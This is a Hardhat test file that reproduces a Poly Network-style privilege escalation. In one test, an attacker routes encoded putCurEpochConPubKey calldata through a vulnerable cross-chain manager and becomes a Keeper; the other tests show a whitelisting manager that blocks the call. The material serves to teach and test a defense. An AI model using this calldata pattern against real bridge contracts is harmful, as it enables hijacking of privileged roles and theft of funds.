const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("04 - Privilege Trap (Poly Network Style)", function () {
  let owner, attacker;

  let crossChainData;
  let vulnerableManager;
  let safeManager;
  let greeter;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    // Deploy Vulnerable Manager
    const VulnerableManager = await ethers.getContractFactory(
      "VulnerableManager",
    );
    vulnerableManager = await VulnerableManager.deploy();
    await vulnerableManager.waitForDeployment();

    // Deploy CrossChainData
    // Owner is VulnerableManager (same idea as Poly Network)
    const CrossChainData = await ethers.getContractFactory("CrossChainData");
    crossChainData = await CrossChainData.deploy(
      await vulnerableManager.getAddress(),
    );
    await crossChainData.waitForDeployment();

    // Deploy Safe Manager
    const SafeManager = await ethers.getContractFactory("SafeManager");
    safeManager = await SafeManager.deploy();
    await safeManager.waitForDeployment();

    // Deploy Greeter
    const Greeter = await ethers.getContractFactory("Greeter");
    greeter = await Greeter.deploy();
    await greeter.waitForDeployment();
  });

  describe("Vulnerable Manager", function () {
    it("Should allow attacker to become Keeper", async function () {
      expect(await crossChainData.isKeeper(attacker.address)).to.equal(false);

      const iface = new ethers.Interface([
        "function putCurEpochConPubKey(address)",
      ]);

      const data = iface.encodeFunctionData("putCurEpochConPubKey", [
        attacker.address,
      ]);

      await vulnerableManager
        .connect(attacker)
        .executeCrossChainTx(await crossChainData.getAddress(), data);

      expect(await crossChainData.isKeeper(attacker.address)).to.equal(true);
    });
  });

  describe("Safe Manager", function () {
    it("Should block privileged admin call", async function () {
      const CrossData = await ethers.getContractFactory("CrossChainData");

      const safeData = await CrossData.deploy(await safeManager.getAddress());

      await safeData.waitForDeployment();

      const iface = new ethers.Interface([
        "function putCurEpochConPubKey(address)",
      ]);

      const data = iface.encodeFunctionData("putCurEpochConPubKey", [
        attacker.address,
      ]);

      await expect(
        safeManager
          .connect(attacker)
          .executeCrossChainTx(await safeData.getAddress(), data),
      ).to.be.revertedWith("target/selector not allowed");
    });

    it("Should allow only whitelisted function", async function () {
      const selector = greeter.interface.getFunction("recordMessage").selector;

      await safeManager.allow(await greeter.getAddress(), selector);

      const data = greeter.interface.encodeFunctionData("recordMessage", [
        "Hello from Safe Manager",
      ]);

      await safeManager.executeCrossChainTx(await greeter.getAddress(), data);

      expect(await greeter.lastMessage()).to.equal("Hello from Safe Manager");
    });
  });
});
